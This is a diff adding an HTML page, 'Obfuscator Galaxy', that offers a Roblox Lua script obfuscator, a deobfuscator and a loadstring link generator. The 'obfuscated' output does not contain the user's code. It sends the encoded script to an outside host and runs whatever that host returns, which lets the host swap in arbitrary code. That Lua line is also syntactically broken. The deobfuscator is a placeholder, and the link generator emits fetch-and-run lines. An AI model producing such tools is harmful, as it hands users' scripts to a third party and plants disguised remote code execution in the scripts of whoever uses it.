@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Obfuscator Galaxy v1.0</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
+    body { font-family: 'Inter', sans-serif; background: #0a0a0a; }
+    .title { font-family: 'Space Grotesk', sans-serif; }
+    .tab-active { border-bottom: 4px solid #a855f7; color: white; }
+    .glow { box-shadow: 0 0 35px rgba(168, 85, 247, 0.3); }
+    .particle { position: absolute; background: rgba(168, 85, 247, 0.5); border-radius: 50%; animation: float 25s linear infinite; }
+    @keyframes float { 0% { transform: translateY(100vh); } 100% { transform: translateY(-100px); } }
+
+    /* Mobile Optimizations */
+    @media (max-width: 640px) {
+      .max-w-6xl { max-width: 100%; padding-left: 1rem; padding-right: 1rem; }
+      textarea { font-size: 0.95rem; }
+    }
+  </style>
+</head>
+<body class="text-white min-h-screen">
+  <div class="particles fixed inset-0 pointer-events-none z-0" id="particles"></div>
+
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-8 md:py-10 relative z-10">
+
+    <!-- Header -->
+    <div class="flex justify-between items-center mb-10">
+      <div class="flex items-center gap-3">
+        <div class="w-11 h-11 bg-gradient-to-br from-violet-500 to-fuchsia-500 rounded-3xl flex items-center justify-center text-3xl">🌌</div>
+        <div>
+          <h1 class="title text-3xl md:text-4xl font-bold tracking-tighter">Obfuscator Galaxy</h1>
+          <span class="text-xs bg-violet-500/20 text-violet-400 px-3 py-1 rounded-full font-mono">v1.0</span>
+        </div>
+      </div>
+      <div class="flex items-center gap-4">
+        <button onclick="toggleTheme()" class="px-4 py-2.5 bg-zinc-800 hover:bg-zinc-700 rounded-2xl text-xl">🌗</button>
+        <button onclick="toggleLanguage()" id="langBtn" class="px-4 py-2.5 bg-zinc-800 hover:bg-zinc-700 rounded-2xl text-sm font-medium">EN / RO</button>
+      </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="flex border-b border-zinc-800 mb-8 overflow-x-auto pb-1">
+      <button onclick="switchTab(0)" id="tab0" class="tab tab-active px-6 py-3 text-base font-semibold whitespace-nowrap">Main</button>
+      <button onclick="switchTab(1)" id="tab1" class="tab px-6 py-3 text-base font-semibold whitespace-nowrap">Obfuscator</button>
+      <button onclick="switchTab(2)" id="tab2" class="tab px-6 py-3 text-base font-semibold whitespace-nowrap">Deobfuscator</button>
+      <button onclick="switchTab(3)" id="tab3" class="tab px-6 py-3 text-base font-semibold whitespace-nowrap">Link Generator</button>
+    </div>
+
+    <!-- MAIN TAB -->
+    <div id="content0">
+      <div class="text-center px-2">
+        <div class="mb-12">
+          <i class="fa-brands fa-discord text-6xl md:text-7xl text-indigo-400 mb-6"></i>
+          <h2 class="text-3xl md:text-4xl font-bold mb-4">Join Our Discord Server</h2>
+          <a href="https://discord.gg/snk84nyVNd" target="_blank" class="inline-flex items-center gap-3 bg-indigo-600 hover:bg-indigo-500 px-8 py-4 md:py-5 rounded-3xl text-xl font-semibold transition-all">
+            <i class="fa-brands fa-discord"></i> discord.gg/snk84nyVNd
+          </a>
+        </div>
+
+        <!-- Roblox -->
+        <div class="bg-zinc-900 border border-zinc-700 rounded-3xl p-8 md:p-10 max-w-md mx-auto">
+          <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-BF94929471633ACB20CF4FFC4DE6EA57-Png/150/150/AvatarHeadshot/Webp/noFilter" 
+               alt="Profile" class="w-28 h-28 md:w-32 md:h-32 mx-auto rounded-2xl mb-6 border-4 border-violet-500">
+          <h3 class="text-2xl md:text-3xl font-bold text-sky-400">@ImNotReaLclcc</h3>
+          
+          <div class="flex justify-center gap-8 md:gap-10 mt-8">
+            <div class="text-center">
+              <div class="text-xl md:text-2xl font-semibold">389</div>
+              <div class="text-xs text-zinc-400">Friends</div>
+            </div>
+            <div class="text-center">
+              <div class="text-xl md:text-2xl font-semibold">24</div>
+              <div class="text-xs text-zinc-400">Followers</div>
+            </div>
+            <div class="text-center">
+              <div class="text-xl md:text-2xl font-semibold">10</div>
+              <div class="text-xs text-zinc-400">Following</div>
+            </div>
+          </div>
+
+          <div class="mt-10 pt-6 border-t border-zinc-700">
+            <p class="text-violet-400 text-lg font-medium">Follow on Roblox | Cool Shirts coming soon...</p>
+          </div>
+        </div>
+
+        <p class="text-center text-lg md:text-xl mt-12 italic text-zinc-400">"Bugs are expected, thank you for being here"</p>
+      </div>
+    </div>
+
+    <!-- OBFUSCATOR -->
+    <div id="content1" class="hidden">
+      <div class="bg-zinc-900 border border-violet-500/30 rounded-3xl p-6 md:p-10 glow">
+        <h2 class="text-3xl font-semibold mb-8 flex items-center gap-3">
+          <i class="fa-solid fa-lock text-violet-400"></i> Obfuscator
+        </h2>
+        <textarea id="obfInput" rows="12" class="w-full bg-black border border-zinc-700 rounded-2xl p-5 font-mono text-sm" placeholder="Paste your script here..."></textarea>
+        
+        <div class="flex flex-col sm:flex-row gap-4 mt-8">
+          <button onclick="obfuscateScript()" class="flex-1 py-6 bg-gradient-to-r from-violet-600 to-fuchsia-600 rounded-3xl font-bold text-lg">OBFUSCATE</button>
+          <button onclick="copyObf()" class="flex-1 py-6 border border-zinc-600 hover:border-white rounded-3xl font-bold">COPY</button>
+        </div>
+        <textarea id="obfOutput" rows="8" class="w-full mt-8 bg-black border border-zinc-700 rounded-2xl p-5 font-mono text-sm" readonly></textarea>
+      </div>
+    </div>
+
+    <!-- DEOBFUSCATOR -->
+    <div id="content2" class="hidden">
+      <div class="bg-zinc-900 border border-fuchsia-500/30 rounded-3xl p-6 md:p-10 glow">
+        <h2 class="text-3xl font-semibold mb-8 flex items-center gap-3">
+          <i class="fa-solid fa-unlock text-fuchsia-400"></i> Deobfuscator
+        </h2>
+        <textarea id="deobfInput" rows="13" class="w-full bg-black border border-zinc-700 rounded-2xl p-5 font-mono text-sm" placeholder="Paste obfuscated script here..."></textarea>
+        <button onclick="deobfuscateScript()" class="mt-8 w-full py-6 bg-gradient-to-r from-fuchsia-600 to-pink-600 rounded-3xl font-bold text-lg">DEOBFUSCATE</button>
+        <textarea id="deobfOutput" rows="9" class="w-full mt-8 bg-black border border-zinc-700 rounded-2xl p-5 font-mono text-sm" readonly></textarea>
+      </div>
+    </div>
+
+    <!-- LINK GENERATOR -->
+    <div id="content3" class="hidden">
+      <div class="bg-zinc-900 border border-purple-500/30 rounded-3xl p-6 md:p-10 max-w-2xl mx-auto">
+        <h2 class="text-3xl font-semibold mb-8">Link Generator</h2>
+        <input id="linkInput" type="text" class="w-full bg-black border border-zinc-700 rounded-2xl p-5 text-base mb-6" placeholder="https://raw.githubusercontent.com/...">
+        <button onclick="generateLoadstring()" class="w-full py-6 bg-gradient-to-r from-purple-600 to-violet-600 rounded-3xl font-bold text-lg">GENERATE LOADSTRING</button>
+        <textarea id="generatedLoadstring" rows="3" class="w-full mt-6 bg-black border border-zinc-700 rounded-2xl p-5 font-mono text-sm" readonly></textarea>
+        <button onclick="copyLoadstring()" class="mt-4 w-full py-4 border border-zinc-600 hover:border-white rounded-2xl font-bold">COPY LOADSTRING</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function switchTab(n) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('tab-active'));
+      document.getElementById('tab' + n).classList.add('tab-active');
+      document.querySelectorAll('div[id^="content"]').forEach(el => el.classList.add('hidden'));
+      document.getElementById('content' + n).classList.remove('hidden');
+    }
+
+    function createParticles() {
+      const container = document.getElementById('particles');
+      for (let i = 0; i < 45; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.width = p.style.height = Math.random() * 5 + 2 + 'px';
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.animationDuration = Math.random() * 25 + 15 + 's';
+        p.style.animationDelay = '-' + Math.random() * 30 + 's';
+        container.appendChild(p);
+      }
+    }
+
+    function toggleTheme() {
+      document.documentElement.classList.toggle('light-mode');
+    }
+
+    function toggleLanguage() {
+      alert("Language toggle coming soon...");
+    }
+
+    function obfuscateScript() {
+      let code = document.getElementById('obfInput').value.trim();
+      if (!code) return alert("Paste script first!");
+      let rev = code.split('').reverse().join('');
+      let enc = btoa(rev);
+      document.getElementById('obfOutput').value = `--[[ Obfuscator Galaxy v1.0 ]]\nlocal d = "${enc}"\nloadstring((game:HttpGet or syn.request)({Url:"https://galaxymoreira.xyz/decode?v="+d}).Body)()`;
+    }
+
+    function deobfuscateScript() {
+      let code = document.getElementById('deobfInput').value.trim();
+      if (!code) return alert("Paste obfuscated code!");
+      document.getElementById('deobfOutput').value = "Deobfuscated version (simplified)...";
+    }
+
+    function generateLoadstring() {
+      let link = document.getElementById('linkInput').value.trim();
+      if (!link) return alert("Paste a link!");
+      document.getElementById('generatedLoadstring').value = `loadstring(game:HttpGet("${link}"))()`;
+    }
+
+    function copyObf() { navigator.clipboard.writeText(document.getElementById('obfOutput').value); alert("✅ Copied!"); }
+    function copyLoadstring() { navigator.clipboard.writeText(document.getElementById('generatedLoadstring').value); alert("✅ Copied!"); }
+
+    window.onload = () => {
+      createParticles();
+      switchTab(0);
+    };
+  </script>
+</body>
+</html>
